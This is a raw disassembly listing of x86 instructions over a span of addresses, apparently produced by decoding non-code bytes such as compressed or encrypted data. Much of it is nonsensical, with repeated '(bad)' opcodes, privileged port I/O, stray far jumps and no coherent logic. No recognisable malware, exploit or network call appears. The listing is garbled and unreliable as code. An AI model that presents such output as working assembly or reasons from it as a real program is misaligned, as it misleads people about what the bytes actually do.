  416a31:	lds    eax,FWORD PTR [ebx-0x13]
  416a34:	adc    DWORD PTR [ebp+0xf810f50],esp
  416a3a:	mov    eax,0x14cc1ad6
  416a3f:	xor    BYTE PTR [ebp-0x52],ah
  416a42:	ret    0x68f3
  416a45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a46:	cmp    DWORD PTR [ecx],0xd201901
  416a4c:	stc    
  416a4d:	test   al,0x96
  416a4f:	arpl   WORD PTR [edi-0x65],ax
  416a52:	imul   edx,DWORD PTR [ecx],0xce6b24d4
  416a58:	push   0xffffffd6
  416a5a:	adc    BYTE PTR [edi+0x56],dh
  416a5d:	in     al,0xd5
  416a5f:	inc    edx
  416a60:	push   ds
  416a61:	clc    
  416a62:	mov    ecx,0xb0377717
  416a67:	pusha  
  416a68:	pop    gs
  416a6a:	xchg   edx,edi
  416a6c:	sbb    DWORD PTR [esi*8+0x44020607],esi
  416a73:	daa    
  416a74:	lds    ebp,FWORD PTR [edi]
  416a76:	jnp    0x416a49
  416a78:	pop    esp
  416a79:	jno    0x416a14
  416a7b:	cmc    
  416a7c:	stc    
  416a7d:	pop    es
  416a7e:	lahf   
  416a7f:	icebp  
  416a80:	neg    DWORD PTR [ecx]
  416a82:	mov    fs,edi
  416a84:	retf   
  416a85:	xlat   BYTE PTR ds:[ebx]
  416a86:	jmp    0x416aa4
  416a88:	ror    dh,0xb4
  416a8b:	ds nop
  416a8d:	das    
  416a8e:	hlt    
  416a8f:	pop    edx
  416a90:	out    0x22,al
  416a92:	pusha  
  416a93:	xchg   esi,ebp
  416a95:	adc    eax,0x58ea9c99
  416a9a:	loopne 0x416a48
  416a9c:	(bad)  
  416a9d:	sbb    ebx,DWORD PTR [eax+ebx*4]
  416aa0:	adc    ebp,ecx
  416aa2:	push   ecx
  416aa3:	sub    BYTE PTR [edi+0x4d],cl
  416aa6:	nop
  416aa7:	lock adc eax,ebp
  416aaa:	scas   al,BYTE PTR es:[edi]
  416aab:	scas   eax,DWORD PTR es:[edi]
  416aac:	jge    0x416a9f
  416aae:	push   ebx
  416aaf:	imul   esp,DWORD PTR [ebp+0x6498baf0],0xffffffe5
  416ab6:	cmp    al,BYTE PTR [edx+eiz*4]
  416ab9:	sub    edx,ebp
  416abb:	inc    ecx
  416abc:	ins    DWORD PTR es:[edi],dx
  416abd:	push   ebx
  416abe:	stos   BYTE PTR es:[edi],al
  416abf:	and    al,0x83
  416ac1:	mov    al,0x3c
  416ac3:	test   DWORD PTR [edi+0x7f08b76b],ebp
  416ac9:	jg     0x416a9f
  416acb:	(bad)  
  416acc:	mov    edi,0xb2d4e731
  416ad1:	rcr    DWORD PTR [ebx+0x5d7d6957],1
  416ad7:	dec    eax
  416ad8:	push   esp
  416ad9:	sbb    esi,ebp
  416adb:	test   BYTE PTR [esi-0x8f6618],bh
  416ae1:	lahf   
  416ae2:	outs   dx,DWORD PTR ds:[esi]
  416ae3:	xchg   edx,eax
  416ae4:	ss adc eax,0xe849a52d
  416aea:	xchg   DWORD PTR [eax-0x7a5fa3b3],ebp
  416af0:	jg     0x416a7b
  416af2:	inc    edi
  416af3:	loop   0x416aea
  416af5:	push   cs
  416af6:	dec    ebp
  416af7:	xor    al,0x8e
  416af9:	shl    esp,0x66
  416afc:	pop    edi
  416afd:	cld    
  416afe:	nop
  416aff:	dec    ecx
  416b00:	sbb    al,0x78
  416b02:	clc    
  416b03:	jge    0x416a96
  416b05:	or     esp,ebx
  416b07:	and    edi,0x5a
  416b0a:	mov    edx,0x8dff44ec
  416b0f:	pop    eax
  416b10:	sub    al,0x51
  416b12:	popa   
  416b13:	sti    
  416b14:	(bad)  
  416b15:	mov    dh,0x39
  416b17:	arpl   WORD PTR [edx-0x14b420da],sp
  416b1d:	and    DWORD PTR [edi],0xffffffe7
  416b20:	xor    BYTE PTR [ebx],bh
  416b22:	jne    0x416b8b
  416b24:	jle    0x416b19
  416b26:	ss mov ebx,0x966f7f02
  416b2c:	loope  0x416b95
  416b2e:	lods   eax,DWORD PTR ds:[esi]
  416b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b30:	lds    edi,FWORD PTR [eax+0x3c4973]
	...
  416b96:	jecxz  0x416bfd
  416b98:	push   cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x27a56b6b
  416ba3:	mov    edi,0xedbfee56
  416ba8:	add    BYTE PTR [eax],al
  416baa:	pop    es
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    BYTE PTR [eax],ah
  416baf:	inc    ebp
  416bb0:	jge    0x416bbb
  416bb2:	cmp    BYTE PTR ds:0xe2815ad4,bl
  416bb8:	mov    esp,0xa4d92ed4
  416bbd:	in     al,dx
  416bbe:	aad    0x40
  416bc0:	mov    ecx,DWORD PTR [ebx+0x69bedf96]
  416bc6:	dec    ecx
  416bc7:	out    dx,eax
  416bc8:	mov    bh,0x83
  416bca:	pop    ebx
  416bcb:	push   edx
  416bcc:	lods   eax,DWORD PTR ds:[esi]
  416bcd:	pop    eax
  416bce:	test   al,0x3b
  416bd0:	dec    ebp
  416bd1:	inc    eax
  416bd2:	cmc    
  416bd3:	cli    
  416bd4:	xor    BYTE PTR [esi-0x2d3d8f29],bh
  416bda:	mov    WORD PTR [esi+ecx*2+0xf],?
  416bde:	sti    
  416bdf:	in     al,0x45
  416be1:	cli    
  416be2:	inc    ecx
  416be3:	imul   ebx
  416be5:	dec    eax
  416be6:	and    edx,ecx
  416be8:	pop    edi
  416be9:	push   0x61
  416beb:	mov    ebx,0x9f02047c
  416bf0:	or     al,0xa4
  416bf2:	jmp    FWORD PTR [edx-0x1c]
  416bf5:	xchg   ebp,eax
  416bf6:	(bad)  
  416bf7:	scas   al,BYTE PTR es:[edi]
  416bf8:	mov    cl,0x34
  416bfa:	test   al,0xe8
  416bfc:	xor    al,0xc8
  416bfe:	loopne 0x416b8f
  416c00:	cmp    DWORD PTR [edx+0x5c],eax
  416c03:	cmp    al,0xee
  416c05:	retf   
  416c06:	cld    
  416c07:	sub    ah,dh
  416c09:	loop   0x416c6f
  416c0b:	stos   BYTE PTR es:[edi],al
  416c0c:	pusha  
  416c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c0e:	pop    es
  416c0f:	shr    DWORD PTR [eax],0x38
  416c12:	push   edi
  416c13:	push   ss
  416c14:	jbe    0x416c80
  416c16:	adc    al,0x8b
  416c18:	pop    ecx
  416c19:	fcomp  QWORD PTR [edi-0x26f4fbc7]
  416c1f:	jne    0x416c52
  416c21:	arpl   sp,bp
  416c23:	stos   BYTE PTR es:[edi],al
  416c24:	mov    eax,0x5df435b3
  416c29:	iret   
  416c2a:	mov    ch,0x1f
  416c2c:	mov    BYTE PTR [esi-0xe],dl
  416c2f:	lds    ecx,FWORD PTR [ecx+0x43de38d5]
  416c35:	cdq    
  416c36:	adc    al,0x9d
  416c38:	in     eax,dx
  416c39:	cmp    dl,BYTE PTR [ecx]
  416c3b:	scas   al,BYTE PTR es:[edi]
  416c3c:	std    
  416c3d:	loop   0x416c20
  416c3f:	out    dx,eax
  416c40:	or     dl,BYTE PTR [eax-0x69560d37]
  416c46:	loop   0x416cb0
  416c48:	cld    
  416c49:	in     eax,dx
  416c4a:	imul   esi,ecx,0xa199f178
  416c50:	xor    ah,BYTE PTR [ebx+0x421552b8]
  416c56:	mov    dl,0xc6
  416c58:	outs   dx,DWORD PTR ds:[esi]
  416c59:	outs   dx,BYTE PTR ds:[esi]
  416c5a:	or     ebx,DWORD PTR [edi-0x23]
  416c5d:	cmp    bl,dl
  416c5f:	stos   BYTE PTR es:[edi],al
  416c60:	push   edi
  416c61:	pop    esp
  416c62:	repz rol BYTE PTR [esp+eax*4-0x4f],cl
  416c67:	leave  
  416c68:	fdivr  st,st(5)
  416c6a:	aas    
  416c6b:	xchg   BYTE PTR [edx],bl
  416c6d:	sbb    ebp,DWORD PTR [ecx+0x47]
  416c70:	imul   ecx,esp,0x3e
  416c73:	pop    eax
  416c74:	int    0x90
  416c76:	(bad)  
  416c77:	sbb    eax,DWORD PTR [esi+eiz*4-0xf4fd09e]
  416c7e:	fs iret 
  416c80:	mov    bh,0x52
  416c82:	push   esp
  416c83:	mov    cl,dl
  416c85:	enter  0xd75c,0x33
  416c89:	xchg   BYTE PTR [eax],cl
  416c8b:	pop    ebx
  416c8c:	pop    ebp
  416c8d:	jg     0x416c80
  416c8f:	xchg   ebx,eax
  416c90:	sub    cl,BYTE PTR ds:0x1514072a
  416c96:	sbb    eax,0x965aaa88
  416c9b:	or     bl,dh
  416c9d:	int    0x57
  416c9f:	ds push cs
  416ca1:	retf   
  416ca2:	pop    esp
  416ca3:	(bad)  [edi]
  416ca5:	shl    DWORD PTR [ecx+edx*4],1
  416ca8:	jmp    0x416c67
  416caa:	mov    ecx,0xe543e3e9
  416caf:	jae    0x416ce9
  416cb1:	ret    0x3e5b
  416cb4:	mov    al,BYTE PTR [eax]
	...
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0xffb080c9,edi
  416d24:	jns    0x416d07
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    dl,dh
  416d2f:	in     eax,0xb
  416d31:	scas   eax,DWORD PTR es:[edi]
  416d32:	inc    ebx
  416d33:	mov    al,0x8d
  416d35:	imul   edi
  416d37:	cmp    DWORD PTR [ebp-0x2],eax
  416d3a:	sub    DWORD PTR [ecx],eax
  416d3c:	repnz dec ebx
  416d3e:	sbb    edi,DWORD PTR [ecx+0x127042cc]
  416d44:	cs push 0x2b68dd12
  416d4a:	ror    DWORD PTR [eax+0x692cde8b],cl
  416d50:	push   di
  416d52:	dec    ebp
  416d53:	jecxz  0x416d38
  416d55:	int    0xea
  416d57:	pop    ecx
  416d58:	lahf   
  416d59:	add    al,0x2e
  416d5b:	clc    
  416d5c:	in     al,0xb1
  416d5e:	jne    0x416dab
  416d60:	pusha  
  416d61:	out    0xa3,al
  416d63:	add    ah,BYTE PTR [ebx]
  416d65:	push   ebp
  416d66:	ja     0x416ddf
  416d68:	jns    0x416db8
  416d6a:	lods   al,BYTE PTR ds:[esi]
  416d6b:	mov    ecx,0x1e928d34
  416d70:	addr16 add eax,0x5e7aa9bb
  416d76:	cdq    
  416d77:	and    BYTE PTR [edi+0x22987209],bh
  416d7d:	mov    ebp,0xddcddbde
  416d82:	arpl   WORD PTR [edi-0x3c],di
  416d85:	mov    edx,0x5a4f18d6
  416d8a:	fsub   DWORD PTR [ebp+0x50ad283]
  416d90:	or     dl,cl
  416d92:	es cmc 
  416d94:	adc    al,BYTE PTR [ebp-0x40]
  416d97:	lds    esi,FWORD PTR [ecx]
  416d99:	jmp    0x416dd3
  416d9b:	aas    
  416d9c:	sub    dh,BYTE PTR [ebx+eiz*4+0x7b1e31d1]
  416da3:	push   ebp
  416da4:	add    al,0x94
  416da6:	mov    al,ds:0xdb5c606f
  416dab:	and    ecx,DWORD PTR [esi-0x57e66c78]
  416db1:	std    
  416db2:	pop    edx
  416db3:	xchg   esp,eax
  416db4:	stos   BYTE PTR es:[edi],al
  416db5:	cmp    bl,dh
  416db7:	adc    al,0x2a
  416db9:	mov    esp,0xb9845321
  416dbe:	fs popw ss
  416dc1:	lock rcl BYTE PTR es:[ebx+0x37d6471f],0x79
  416dca:	adc    al,0x16
  416dcc:	sbb    eax,0x8fcba4bd
  416dd1:	and    al,0xd4
  416dd3:	mov    eax,ds:0xcabbedf1
  416dd8:	data16 in al,0xdd
  416ddb:	mul    DWORD PTR [ebx]
  416ddd:	push   esp
  416dde:	repz loope 0x416de9
  416de1:	push   0xf7d0f831
  416de6:	cwde   
  416de7:	rol    DWORD PTR [ebx+0x7ee5caf7],0x80
  416dee:	mov    al,0x61
  416df0:	jmp    0x416e51
  416df2:	sub    al,0xcf
  416df4:	mov    ch,0x1
  416df6:	add    eax,0x4f56e5f3
  416dfb:	out    0xb1,eax
  416dfd:	ret    0xd23f
  416e00:	pushf  
  416e01:	jp     0x416d86
  416e03:	push   ebx
  416e04:	daa    
  416e05:	in     al,0xb8
  416e07:	and    eax,0xeaff4a6b
  416e0c:	push   ebx
  416e0d:	in     eax,dx
  416e0e:	inc    esp
  416e0f:	daa    
  416e10:	push   esp
  416e11:	(bad)  
  416e12:	mov    edx,0xfc86dc2d
  416e17:	dec    edi
  416e18:	nop
  416e19:	ret    0x2a4b
  416e1c:	pop    ebx
  416e1d:	(bad)  [eax*8-0x4922bed5]
  416e24:	mov    edi,0x45f44b4d
  416e29:	mov    al,ds:0x167cdbe7
  416e2e:	sbb    eax,0xf860ebf9
  416e33:	adc    al,0x26
	...
  416e95:	add    BYTE PTR [edi-0x519271e7],bh
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8-0x7eae78ae]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR [edx+0x5c5c38f8],bh
  416eb3:	mov    dl,0xa0
  416eb5:	dec    ecx
  416eb6:	pop    edx
  416eb7:	inc    esp
  416eb8:	lahf   
  416eb9:	fcmovnbe st,st(5)
  416ebb:	jb     0xab3a39e2
  416ec1:	(bad)  
  416ec2:	jo     0x416e7c
  416ec4:	push   0x4fddc312
  416ec9:	add    BYTE PTR [edi-0x24],cl
  416ecc:	arpl   WORD PTR [ecx+esi*1+0x1c9b2bed],ax
  416ed3:	mov    edi,DWORD PTR [esi+0x1a]
  416ed6:	das    
  416ed7:	sub    al,0x8a
  416ed9:	xchg   edx,eax
  416eda:	fisubr DWORD PTR [eax-0x60]
  416edd:	add    ah,BYTE PTR [ecx-0x3aaf43ae]
  416ee3:	pop    ebp
  416ee4:	daa    
  416ee5:	sbb    edx,DWORD PTR ds:0xe384778a
  416eeb:	ret    
  416eec:	outs   dx,BYTE PTR ds:[esi]
  416eed:	hlt    
  416eee:	daa    
  416eef:	cmp    DWORD PTR [esi],edx
  416ef1:	jb     0x416f17
  416ef3:	ficom  DWORD PTR [eax-0x5d91851f]
  416ef9:	mov    dh,0x9c
  416efb:	mov    dl,BYTE PTR [esi]
  416efd:	xor    al,0xa9
  416eff:	lock mov dh,0xcb
  416f02:	rol    BYTE PTR [eax],cl
  416f04:	lea    esi,[esi+0x72]
  416f07:	(bad)  
  416f09:	popf   
  416f0a:	pop    esp
  416f0b:	push   esp
  416f0c:	lods   al,BYTE PTR ds:[esi]
  416f0d:	call   0xd84d4fd7
  416f12:	or     al,0xcb
  416f14:	in     al,0xf8
  416f16:	fmul   DWORD PTR [ebx-0x60]
  416f19:	push   ebx
  416f1a:	or     DWORD PTR [ebx-0x2a],0xfd657c65
  416f21:	inc    ebx
  416f22:	xor    edx,edi
  416f24:	mov    dh,BYTE PTR [edi]
  416f26:	add    al,0x78
  416f28:	xchg   ebp,eax
  416f29:	mov    bh,0x85
  416f2b:	xchg   BYTE PTR [edx],al
  416f2d:	jg     0x416ed6
  416f2f:	pusha  
  416f30:	xchg   ebx,eax
  416f31:	pop    edx
  416f32:	mov    ds:0x66ac2839,eax
  416f37:	jo     0x416f42
  416f39:	mov    eax,ds:0xfe7a69b6
  416f3e:	dec    edi
  416f3f:	jbe    0x416f17
  416f41:	or     esi,esp
  416f43:	call   0x3766938c
  416f48:	ret    0xb5f9
  416f4b:	sbb    ch,BYTE PTR [edi]
  416f4d:	test   eax,0xbc01c428
  416f52:	sub    al,0x5
  416f54:	pop    eax
  416f55:	push   esi
  416f56:	shl    BYTE PTR [edx-0x6b15612c],0x6
  416f5d:	es dec ebx
  416f5f:	inc    edi
  416f60:	sbb    edi,DWORD PTR [eax]
  416f62:	mov    al,ds:0xd9875a9
  416f67:	or     ebp,DWORD PTR ds:0xd297d7b1
  416f6d:	rcr    dh,1
  416f6f:	jae    0x416f8f
  416f71:	jge    0x416ff1
  416f73:	jmp    0x537d87af
  416f78:	arpl   sp,bx
  416f7a:	jbe    0x416f42
  416f7c:	pop    edx
  416f7d:	scas   al,BYTE PTR es:[edi]
  416f7e:	pop    edx
  416f7f:	(bad)  
  416f80:	retf   
  416f81:	in     al,0xaf
  416f83:	enter  0xc446,0x5
  416f87:	rcr    DWORD PTR [ecx-0x5212727c],0xc8
  416f8e:	ins    BYTE PTR es:[edi],dx
  416f8f:	pop    ebx
  416f90:	add    esp,edx
  416f92:	mov    eax,ds:0xa94f7596
  416f97:	pop    es
  416f98:	dec    esp
  416f99:	cld    
  416f9a:	mov    ch,0x2
  416f9c:	jae    0x416f9c
  416f9e:	jo     0x416fea
  416fa0:	xchg   edi,eax
  416fa1:	sub    al,0xdc
  416fa3:	out    0x45,eax
  416fa5:	imul   ebp,DWORD PTR [edi-0x52],0x26
  416fa9:	dec    esp
  416faa:	jl     0x416fb5
  416fac:	push   ebx
  416fad:	test   eax,0xa1f6e686
  416fb2:	mov    ecx,0xe749
	...
  417013:	add    BYTE PTR [eax],al
  417015:	add    BYTE PTR [esi+0x2d],dh
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	push   edx
  417023:	jbe    0x417032
  417025:	adc    al,0xd4
  417027:	lock add BYTE PTR [eax],al
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [edx+0x79606b72],bl
  417033:	shr    DWORD PTR [esi-0x1d],1
  417036:	mov    eax,ds:0x50cbbf2b
  41703b:	add    BYTE PTR [eax+ecx*1],ah
  41703e:	jp     0x416fe9
  417040:	in     al,dx
  417041:	ins    BYTE PTR es:[edi],dx
  417042:	jle    0x416ff2
  417044:	inc    ecx
  417045:	sbb    BYTE PTR [esi+0x7f],dl
  417048:	aaa    
  417049:	dec    edi
  41704a:	xchg   edx,eax
  41704b:	mov    ch,0xb7
  41704d:	xchg   edi,eax
  41704e:	push   edx
  41704f:	clc    
  417050:	fisub  DWORD PTR [ebx+esi*2+0x3]
  417054:	cmp    eax,0x4c195d52
  417059:	clc    
  41705a:	mov    ch,0x6e
  41705c:	call   0x80ab:0x19496dd3
  417063:	or     al,0x1
  417065:	xchg   ch,bh
  417067:	test   edx,ebp
  417069:	fwait
  41706a:	out    0xb9,al
  41706c:	pop    ecx
  41706d:	gs test esp,esp
  417070:	jecxz  0x417026
  417072:	inc    ebx
  417073:	leave  
  417074:	add    esp,DWORD PTR [eax+0x11]
  417077:	add    eax,0xcca35405
  41707c:	je     0x4170e0
  41707e:	out    0xc7,eax
  417080:	xchg   bh,dl
  417082:	xchg   ebp,eax
  417083:	add    al,0x46
  417085:	sub    ebp,DWORD PTR ds:0xc3734619
  41708b:	test   edi,ecx
  41708d:	cs ds mov dh,0x56
  417091:	addr16 jle 0x417084
  417094:	pop    ebx
  417095:	mov    ebx,eax
  417097:	daa    
  417098:	sub    al,0x8a
  41709a:	(bad)  
  41709b:	jmp    0x76c574fc
  4170a0:	jae    0x417074
  4170a2:	fcmove st,st(5)
  4170a4:	pop    ss
  4170a5:	push   es
  4170a6:	adc    bh,BYTE PTR [ebp+0x7]
  4170a9:	mov    ebp,0x71104aee
  4170ae:	push   ebx
  4170af:	mov    eax,ds:0xa696f266
  4170b4:	push   es
  4170b5:	xor    al,0x6d
  4170b7:	add    eax,0x83743d52
  4170bc:	adc    BYTE PTR [ebp-0xb],bh
  4170bf:	pop    ebp
  4170c0:	inc    esi
  4170c1:	mov    edx,0x4459c73a
  4170c6:	mov    ecx,0x57c6b342
  4170cb:	pop    edi
  4170cc:	mov    WORD PTR [eax+0x37b22046],?
  4170d2:	scas   al,BYTE PTR es:[edi]
  4170d3:	std    
  4170d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d5:	adc    eax,0x9dfe1d29
  4170da:	jle    0x4170d4
  4170dc:	stos   DWORD PTR es:[edi],eax
  4170dd:	add    al,0xfa
  4170df:	cli    
  4170e0:	sbb    ebx,DWORD PTR [ecx]
  4170e2:	cli    
  4170e3:	pop    ebx
  4170e4:	in     eax,dx
  4170e5:	sti    
  4170e6:	call   0x3602:0xbbacfc6b
  4170ed:	and    dl,dh
  4170ef:	sub    DWORD PTR [ecx],esp
  4170f1:	ffree  st(4)
  4170f3:	sub    eax,0xc47f0aa9
  4170f8:	loop   0x4170bd
  4170fa:	xor    DWORD PTR [esi-0x38d3da69],edx
  417100:	xchg   ebx,eax
  417101:	mov    dl,dl
  417103:	dec    esp
  417104:	cmp    al,0x97
  417106:	sub    ebp,DWORD PTR [ebp-0x3228a5f]
  41710c:	adc    dh,dh
  41710e:	mov    dh,0x4f
  417110:	or     eax,0x48b1fdc7
  417115:	daa    
  417116:	arpl   WORD PTR [edi-0x7],cx
  417119:	push   edx
  41711a:	dec    esp
  41711b:	iret   
  41711c:	in     al,0xaa
  41711e:	or     BYTE PTR [esp+ebp*4],bl
  417121:	mov    al,0x10
  417123:	(bad)  
  417124:	ja     0x417144
  417126:	push   edx
  417127:	cmp    DWORD PTR [esi],edx
  417129:	or     cl,BYTE PTR [esi-0x629a049e]
  41712f:	test   DWORD PTR [esi-0x1e11b5d3],ebp
	...
  417195:	add    BYTE PTR [esi-0xe58fe7],ah
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	mov    BYTE PTR [ecx+0x63],dh
  4171a5:	push   esp
  4171a6:	fcomi  st,st(1)
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [edi-0x46fae0be],cl
  4171b3:	mov    bh,bl
  4171b5:	int3   
  4171b6:	cmp    dl,al
  4171b8:	sbb    al,BYTE PTR [edx+0x73313106]
  4171be:	loop   0x417152
  4171c0:	call   0x552b:0xbbfab243
  4171c7:	in     eax,dx
  4171c8:	inc    eax
  4171c9:	adc    al,0xc
  4171cb:	pop    edi
  4171cc:	sbb    dl,BYTE PTR [edx]
  4171ce:	cs in  eax,0x7c
  4171d1:	sar    DWORD PTR [ebx-0x109d1f],0x4a
  4171d8:	adc    eax,0x86cfbabd
  4171dd:	xor    al,0x6
  4171df:	in     eax,dx
  4171e0:	sahf   
  4171e1:	rcr    eax,cl
  4171e3:	push   esi
  4171e4:	ins    DWORD PTR es:[edi],dx
  4171e5:	or     dh,BYTE PTR [ebx+ebp*8+0x73]
  4171e9:	scas   al,BYTE PTR es:[edi]
  4171ea:	(bad)  
  4171eb:	fistp  DWORD PTR [edi]
  4171ed:	lahf   
  4171ee:	(bad)  
  4171ef:	adc    al,0xcc
  4171f1:	mov    ecx,0xab77c76b
  4171f6:	stc    
  4171f7:	mov    al,ds:0x8de4e833
  4171fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171fd:	sahf   
  4171fe:	add    DWORD PTR [ebp-0x25],0x2b227fc5
  417205:	clc    
  417206:	xchg   ebx,eax
  417207:	xchg   edi,eax
  417208:	mov    ebx,0x976714dc
  41720d:	loope  0x417208
  41720f:	fcmovnbe st,st(7)
  417211:	fbstp  TBYTE PTR [edx]
  417213:	dec    esp
  417214:	dec    esi
  417215:	inc    ebp
  417216:	stc    
  417217:	scas   al,BYTE PTR es:[edi]
  417218:	sub    BYTE PTR [ecx+0x5a],bh
  41721b:	rcl    DWORD PTR [edx-0x32],cl
  41721e:	mov    bl,0xb9
  417220:	outs   dx,DWORD PTR ds:[esi]
  417221:	in     eax,0x6a
  417223:	cmp    DWORD PTR [edx-0x40d29f21],0x69
  41722a:	and    al,0xd2
  41722c:	sbb    edx,DWORD PTR [edi]
  41722e:	jbe    0x41729c
  417230:	inc    esi
  417231:	xchg   bh,cl
  417233:	mov    dh,0xce
  417235:	cmp    ebx,edi
  417237:	sub    bl,BYTE PTR [edx]
  417239:	ja     0x417225
  41723b:	xchg   edi,eax
  41723c:	and    ecx,ebp
  41723e:	jnp    0x4171f1
  417240:	add    eax,0xec8e9dbc
  417245:	das    
  417246:	push   ds
  417247:	cmp    BYTE PTR [esi],dh
  417249:	gs mov esp,0x79af573f
  41724f:	retf   
  417250:	mov    al,0x89
  417252:	sub    dl,BYTE PTR [ecx-0x68]
  417255:	cmp    eax,0xb9752f87
  41725a:	jp     0x417200
  41725c:	(bad)  
  41725d:	cmp    eax,0x36d5aaea
  417262:	cmp    eax,0x1abce977
  417267:	push   edi
  417268:	test   dh,0x69
  41726b:	xor    DWORD PTR [ecx+0x46],esp
  41726e:	int3   
  41726f:	mov    ecx,0xa1014fe7
  417274:	pushf  
  417275:	test   DWORD PTR [eax+esi*4],edx
  417278:	mov    al,0x72
  41727a:	jnp    0x417264
  41727c:	jmp    0x1569:0xeaeb7353
  417283:	shl    dh,1
  417285:	and    eax,0x26
  417288:	rol    BYTE PTR [ebx-0x54603fc8],cl
  41728e:	ds pop ebp
  417290:	mov    ecx,0xd927c9b9
  417295:	rcl    BYTE PTR [eax+0x1545065a],1
  41729b:	pop    esi
  41729c:	cmp    ah,ch
  41729e:	mov    ch,al
  4172a0:	and    DWORD PTR [edx+edi*1],0xffffff8a
  4172a4:	aaa    
  4172a5:	in     eax,dx
  4172a6:	adc    al,0xa2
  4172a8:	adc    al,0x63
  4172aa:	and    DWORD PTR [esi-0x5a11bec7],eax
  4172b0:	bound  esp,QWORD PTR [edi]
  4172b2:	cmp    DWORD PTR [eax+0x3f],0x0
	...
  417314:	add    BYTE PTR [eax],al
  417316:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0xe5bf4abf
  417321:	test   DWORD PTR [ebx+0x60],eax
  417324:	sbb    esi,esi
  417326:	loop   0x41731a
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [edx-0x75054a0a],ah
  417333:	add    al,0xcd
  417335:	pop    ebp
  417336:	ret    0xc5ab
  417339:	fs repz jecxz 0x4172c9
  41733d:	sub    eax,0xfca564a8
  417342:	xor    al,0xbb
  417344:	ror    DWORD PTR [esi+0x2c],cl
  417347:	dec    esp
  417348:	retf   0x8ce7
  41734b:	jb     0x4172df
  41734d:	add    eax,0xb62bfb86
  417352:	adc    BYTE PTR [edx+ecx*2+0x4f52fff7],dl
  417359:	pop    ebx
  41735a:	(bad)  
  41735b:	lock popa 
  41735d:	stos   DWORD PTR es:[edi],eax
  41735e:	xor    ebp,DWORD PTR [edi-0x3e]
  417361:	mov    edi,0x907bb8c0
  417366:	es mul esi
  417369:	shl    DWORD PTR [edx-0x7],1
  41736c:	fistp  DWORD PTR [eax+eiz*1-0x6]
  417370:	xor    DWORD PTR [ecx-0xf02c51a],ebx
  417376:	fscale 
  417378:	dec    ebp
  417379:	sbb    al,0x5a
  41737b:	hlt    
  41737c:	sub    al,0x8d
  41737e:	ss push edi
  417380:	pop    ds
  417381:	inc    edx
  417382:	in     al,0x40
  417384:	mov    eax,edi
  417386:	ret    0x4c2d
  417389:	push   cs
  41738a:	lahf   
  41738b:	outs   dx,DWORD PTR ds:[esi]
  41738c:	jmp    0x34cd:0x4833f9e
  417393:	xchg   BYTE PTR [edi-0x70],ah
  417396:	std    
  417397:	inc    edx
  417398:	or     BYTE PTR [edx],dh
  41739a:	dec    edi
  41739b:	(bad)  
  41739c:	mov    edx,0x604233ae
  4173a1:	test   al,0x8b
  4173a3:	push   esi
  4173a4:	loop   0x417373
  4173a6:	mov    esp,0x2dcc3a8e
  4173ab:	sbb    eax,DWORD PTR [edi+eax*2-0x6e3fc891]
  4173b2:	cmp    DWORD PTR [ebx+0x64],esp
  4173b5:	sbb    al,0x48
  4173b7:	stos   DWORD PTR es:[edi],eax
  4173b8:	mov    edx,esp
  4173ba:	mov    ebp,0xd5ed94d6
  4173bf:	cmp    DWORD PTR [edx-0x5d5d5337],eax
  4173c5:	inc    ecx
  4173c6:	mov    ?,ebp
  4173c8:	pop    esp
  4173c9:	outs   dx,DWORD PTR ds:[esi]
  4173ca:	mov    ebp,0x18999e08
  4173cf:	ret    
  4173d0:	mov    dl,0xfa
  4173d2:	fisub  DWORD PTR ds:0xe5a6ba1d
  4173d8:	mov    al,0xa1
  4173da:	xor    bl,ch
  4173dc:	mov    ch,BYTE PTR [ebp+0x2de1b676]
  4173e2:	xor    ebp,eax
  4173e4:	jb     0x417449
  4173e6:	sbb    al,0x17
  4173e8:	mov    edi,0x6122541f
  4173ed:	out    0x4e,eax
  4173ef:	jb     0x417437
  4173f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173f2:	adc    eax,0x6c3c0114
  4173f7:	dec    esp
  4173f8:	pop    ds
  4173f9:	sub    eax,0x662ba83
  4173fe:	or     dh,BYTE PTR [ecx-0x4e]
  417401:	or     al,BYTE PTR [eax]
  417403:	adc    al,0x5d
  417405:	add    bl,BYTE PTR [ebp-0x64]
  417408:	or     BYTE PTR [esi],bl
  41740a:	out    0x8a,eax
  41740c:	push   0x9f0e4305
  417411:	scas   eax,DWORD PTR es:[edi]
  417412:	adc    DWORD PTR [edx],esp
  417414:	or     edx,DWORD PTR [esi]
  417416:	inc    edi
  417417:	jne    0x4173bf
  417419:	or     dl,BYTE PTR [edx+0x26]
  41741c:	jbe    0x417406
  41741e:	outs   dx,DWORD PTR ds:[esi]
  41741f:	xchg   esp,eax
  417420:	cld    
  417421:	fnsave [eax+0x6d20af3f]
  417427:	loop   0x4173fc
  417429:	clc    
  41742a:	sbb    eax,0xe5f58413
  41742f:	or     eax,0x81c25233
